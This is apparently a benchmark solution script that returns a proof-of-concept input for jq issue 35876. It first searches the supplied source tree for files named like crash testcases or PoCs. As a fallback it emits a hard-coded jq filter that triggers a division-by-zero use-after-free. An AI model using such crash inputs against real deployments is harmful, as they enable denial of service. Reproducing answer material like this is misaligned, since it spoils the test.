import os
import re
import tarfile
from typing import Iterator, List, Optional, Tuple


class Solution:
    _ISSUE_ID = "35876"

    def _iter_tar_files(self, tar_path: str) -> Iterator[Tuple[str, int, callable]]:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue

                name = m.name
                size = int(m.size)

                def _reader(member=m, tfile=tf):
                    f = tfile.extractfile(member)
                    if f is None:
                        return b""
                    return f.read()

                yield name, size, _reader

    def _iter_dir_files(self, dir_path: str) -> Iterator[Tuple[str, int, callable]]:
        base = os.path.abspath(dir_path)
        for root, _, files in os.walk(base):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                rel = os.path.relpath(p, base).replace(os.sep, "/")
                size = int(st.st_size)

                def _reader(path=p):
                    try:
                        with open(path, "rb") as f:
                            return f.read()
                    except OSError:
                        return b""

                yield rel, size, _reader

    def _iter_files(self, src_path: str) -> Iterator[Tuple[str, int, callable]]:
        if os.path.isdir(src_path):
            yield from self._iter_dir_files(src_path)
            return
        yield from self._iter_tar_files(src_path)

    @staticmethod
    def _is_text(b: bytes) -> bool:
        if not b:
            return True
        if b"\x00" in b:
            return False
        sample = b[:4096]
        bad = 0
        for c in sample:
            if c in (9, 10, 13):
                continue
            if 32 <= c <= 126:
                continue
            bad += 1
        return bad <= max(8, len(sample) // 50)

    @staticmethod
    def _decode_text(b: bytes) -> str:
        try:
            return b.decode("utf-8", errors="replace")
        except Exception:
            return b.decode("latin-1", errors="replace")

    @staticmethod
    def _score_line(line: str) -> int:
        s = 0
        if "/=" in line:
            s += 7
        if re.search(r"\btry\b", line):
            s += 5
        if re.search(r"\bcatch\b", line):
            s += 5
        if re.search(r"\b0\b", line):
            s += 3
        if "division by zero" in line.lower():
            s += 7
        if "ZeroDivision" in line:
            s += 7
        if "$" in line:
            s += 1
        if "{" in line or "[" in line:
            s += 1
        return s

    def _extract_best_line(self, text: str) -> Optional[str]:
        best = None
        best_key = None
        for raw in text.splitlines():
            line = raw.strip()
            if not line:
                continue
            if line.startswith(("#", "//", "/*", "*", "--")):
                continue
            sc = self._score_line(line)
            if sc <= 0:
                continue
            key = (-sc, len(line))
            if best is None or key < best_key:
                best = line
                best_key = key
        return best

    @staticmethod
    def _maybe_jq_project(paths: List[str], small_texts: List[str]) -> bool:
        for p in paths:
            pl = p.lower()
            if pl.endswith("src/main.c") or pl.endswith("src/jv.c") or pl.endswith("src/execute.c") or pl.endswith("src/parser.y"):
                return True
            if pl.endswith("jv.h") or pl.endswith("jq.h"):
                return True
        for t in small_texts:
            if "jq_state" in t and "jq_init" in t:
                return True
            if "jv_parse" in t and "jq_compile" in t:
                return True
        return False

    def _detect_jq_fuzzer_mode(self, texts: List[str]) -> str:
        # returns "filter_only" or "filter_json"
        for t in texts:
            if "LLVMFuzzerTestOneInput" not in t:
                continue
            has_jq = ("jq_compile" in t) or ("jq_compile_args" in t) or ("jq_init" in t)
            if not has_jq:
                continue
            has_jv = "jv_parse" in t or "jv_parser" in t
            splits = ("memchr" in t and ("'\\n'" in t or "\"\\n\"" in t)) or ("\\n" in t and "split" in t.lower())
            if has_jq and has_jv and splits:
                return "filter_json"
        return "filter_only"

    @staticmethod
    def _fallback_jq_filter() -> bytes:
        # Aim: compound division by zero inside try/catch, then access preserved value after failure.
        filt = b'{"a":[0]} as $x|try(.a[0]/=.a[0])catch $x|.a[0]\n'
        return filt

    def solve(self, src_path: str) -> bytes:
        paths: List[str] = []
        small_texts: List[str] = []

        direct_name_hits: List[Tuple[int, str, bytes]] = []
        direct_content_hits: List[Tuple[int, str, bytes]] = []
        line_hits: List[Tuple[int, int, str]] = []

        # First pass: look for obvious PoC files and gather small texts for detection.
        for name, size, reader in self._iter_files(src_path):
            paths.append(name)

            nl = name.lower()
            name_hit = (
                self._ISSUE_ID in nl
                or "clusterfuzz" in nl
                or "testcase" in nl
                or "poc" in nl
                or "repro" in nl
                or "crash" in nl
                or "uaf" in nl
                or "use-after-free" in nl
                or "use_after_free" in nl
                or "div0" in nl
                or "division" in nl
                or "divide-by-zero" in nl
                or "divide_by_zero" in nl
            )

            if size <= 256 * 1024:
                b = reader()
            else:
                # Read only a prefix for searching/detection
                b_full = reader()
                b = b_full[:256 * 1024] if b_full else b_full

            if not b:
                continue

            is_text = self._is_text(b)
            if is_text and len(small_texts) < 200:
                small_texts.append(self._decode_text(b))

            if name_hit and size <= 64 * 1024:
                full = b if size <= 256 * 1024 else reader()
                direct_name_hits.append((len(full), name, full))

            if is_text:
                t = self._decode_text(b)
                if self._ISSUE_ID in t and size <= 64 * 1024:
                    full = b if size <= 256 * 1024 else reader()
                    direct_content_hits.append((len(full), name, full))

                # Look for a minimal line candidate in small-ish text files
                if size <= 64 * 1024:
                    best_line = self._extract_best_line(t)
                    if best_line:
                        sc = self._score_line(best_line)
                        line_hits.append((sc, len(best_line), best_line))

        # Prefer an explicitly named PoC-like file.
        if direct_name_hits:
            direct_name_hits.sort(key=lambda x: (x[0], x[1]))
            data = direct_name_hits[0][2]
            if not data.endswith(b"\n"):
                data += b"\n"
            return data

        # Next, prefer a file that references the issue id in content.
        if direct_content_hits:
            direct_content_hits.sort(key=lambda x: (x[0], x[1]))
            data = direct_content_hits[0][2]
            if not data.endswith(b"\n"):
                data += b"\n"
            return data

        # Next, use a best-looking single line snippet.
        if line_hits:
            line_hits.sort(key=lambda x: (-x[0], x[1]))
            return (line_hits[0][2] + "\n").encode("utf-8", errors="ignore")

        # Fallback: if this looks like jq, emit jq filter.
        if self._maybe_jq_project(paths, small_texts):
            mode = self._detect_jq_fuzzer_mode(small_texts)
            if mode == "filter_json":
                return self._fallback_jq_filter() + b"null\n"
            return self._fallback_jq_filter()

        # Generic fallback: try a few common script-like payloads (as bytes).
        # Keep it simple and short.
        return b'{"a":[0]} as $x|try(.a[0]/=.a[0])catch $x|.a[0]\n'